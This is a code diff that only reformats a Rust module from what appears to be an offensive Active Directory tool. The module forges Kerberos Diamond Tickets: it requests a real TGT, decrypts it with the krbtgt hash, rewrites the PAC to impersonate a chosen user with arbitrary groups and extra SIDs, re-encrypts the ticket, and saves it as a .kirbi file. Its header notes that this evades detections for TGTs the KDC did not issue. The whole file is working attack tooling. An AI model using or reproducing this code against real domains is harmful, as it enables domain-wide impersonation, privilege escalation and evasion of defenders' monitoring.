@@ -1,17 +1,15 @@
-﻿//! Diamond Ticket forging — modify a legitimately requested TGT's PAC.
+//! Diamond Ticket forging — modify a legitimately requested TGT's PAC.
 //!
 //! Unlike Golden Tickets (forged from scratch), Diamond Tickets start
 //! with a real TGT, decrypt it with the krbtgt key, modify the PAC,
 //! and re-encrypt. This bypasses detections that check for TGTs not
 //! issued by the KDC.
 
-use overthrone_core::error::{OverthroneError, Result};
-use overthrone_core::proto::kerberos::{
-    self, ETYPE_AES256_CTS, ETYPE_RC4_HMAC,
-};
+use chrono::{Duration, Utc};
 use kerberos_asn1::{Asn1Object, EncTicketPart, EncryptedData, Ticket};
 use kerberos_crypto::new_kerberos_cipher;
-use chrono::{Duration, Utc};
+use overthrone_core::error::{OverthroneError, Result};
+use overthrone_core::proto::kerberos::{self, ETYPE_AES256_CTS, ETYPE_RC4_HMAC};
 use tracing::info;
 
 use crate::golden;
@@ -22,35 +20,44 @@ use crate::validate;
 pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[diamond] Forging Diamond Ticket for {}", config.domain);
 
-    let krbtgt_hash = config.krbtgt_hash.as_deref()
+    let krbtgt_hash = config
+        .krbtgt_hash
+        .as_deref()
         .or(config.krbtgt_aes256.as_deref())
-        .ok_or_else(|| OverthroneError::TicketForge(
-            "krbtgt hash is required for Diamond Ticket".into()
-        ))?;
+        .ok_or_else(|| {
+            OverthroneError::TicketForge("krbtgt hash is required for Diamond Ticket".into())
+        })?;
 
-    let domain_sid = config.domain_sid.as_deref()
-        .ok_or_else(|| OverthroneError::TicketForge(
-            "Domain SID is required for Diamond Ticket".into()
-        ))?;
+    let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
+        OverthroneError::TicketForge("Domain SID is required for Diamond Ticket".into())
+    })?;
 
     validate::validate_sid_format(domain_sid)?;
 
-    let password = config.password.as_deref()
-        .ok_or_else(|| OverthroneError::TicketForge(
-            "Password is required for Diamond Ticket (to request legitimate TGT)".into()
-        ))?;
+    let password = config.password.as_deref().ok_or_else(|| {
+        OverthroneError::TicketForge(
+            "Password is required for Diamond Ticket (to request legitimate TGT)".into(),
+        )
+    })?;
 
     // Step 1: Request a legitimate TGT from the KDC
-    info!("[diamond] Step 1: Requesting legitimate TGT as {}", config.username);
+    info!(
+        "[diamond] Step 1: Requesting legitimate TGT as {}",
+        config.username
+    );
     let legit_tgt = kerberos::request_tgt(
         &config.dc_ip,
         &config.domain,
         &config.username,
         password,
         false, // use password, not hash
-    ).await?;
+    )
+    .await?;
 
-    info!("[diamond] Legitimate TGT obtained (etype: {})", legit_tgt.session_key_etype);
+    info!(
+        "[diamond] Legitimate TGT obtained (etype: {})",
+        legit_tgt.session_key_etype
+    );
 
     // Step 2: Decrypt the ticket's enc-part using krbtgt key
     info!("[diamond] Step 2: Decrypting ticket with krbtgt key");
@@ -60,9 +67,12 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     let krbtgt_etype = match krbtgt_key.len() {
         16 => ETYPE_RC4_HMAC,
         32 => ETYPE_AES256_CTS,
-        _ => return Err(OverthroneError::TicketForge(
-            format!("krbtgt key must be 16 or 32 bytes, got {}", krbtgt_key.len())
-        )),
+        _ => {
+            return Err(OverthroneError::TicketForge(format!(
+                "krbtgt key must be 16 or 32 bytes, got {}",
+                krbtgt_key.len()
+            )));
+        }
     };
 
     let cipher = new_kerberos_cipher(krbtgt_etype)
@@ -84,9 +94,14 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     let realm = config.domain.to_uppercase();
 
     let new_pac = golden::build_pac(
-        impersonate, &realm, domain_sid,
-        config.user_rid, &groups, &config.extra_sids,
-        &krbtgt_key, krbtgt_etype,
+        impersonate,
+        &realm,
+        domain_sid,
+        config.user_rid,
+        &groups,
+        &config.extra_sids,
+        &krbtgt_key,
+        krbtgt_etype,
     )?;
 
     // Replace authorization data (which contains the PAC)
@@ -101,7 +116,10 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
             name_type: 1, // NT_PRINCIPAL
             name_string: vec![impersonate.to_string()],
         };
-        info!("[diamond] Changed cname: {} → {}", config.username, impersonate);
+        info!(
+            "[diamond] Changed cname: {} → {}",
+            config.username, impersonate
+        );
     }
 
     // Step 4: Re-encrypt with krbtgt key
@@ -121,13 +139,19 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
 
     let ticket_bytes = forged_ticket.build();
     let kirbi_bytes = golden::build_krb_cred(
-        &forged_ticket, &enc_ticket, &legit_tgt.session_key, krbtgt_etype,
+        &forged_ticket,
+        &enc_ticket,
+        &legit_tgt.session_key,
+        krbtgt_etype,
     )?;
     let kirbi_path = golden::save_ticket(config, &kirbi_bytes, "diamond")?;
     let etype_str = golden::etype_name(krbtgt_etype);
     let now = Utc::now();
 
-    info!("[diamond] Diamond Ticket forged ({} bytes)", ticket_bytes.len());
+    info!(
+        "[diamond] Diamond Ticket forged ({} bytes)",
+        ticket_bytes.len()
+    );
 
     Ok(ForgeResult {
         action: "Diamond Ticket".into(),
@@ -141,7 +165,8 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
             encryption_type: etype_str.into(),
             valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
             valid_until: (now + Duration::hours(config.effective_lifetime() as i64))
-                .format("%Y-%m-%d %H:%M:%S UTC").to_string(),
+                .format("%Y-%m-%d %H:%M:%S UTC")
+                .to_string(),
             group_rids: groups,
             extra_sids: config.extra_sids.clone(),
             kirbi_path,
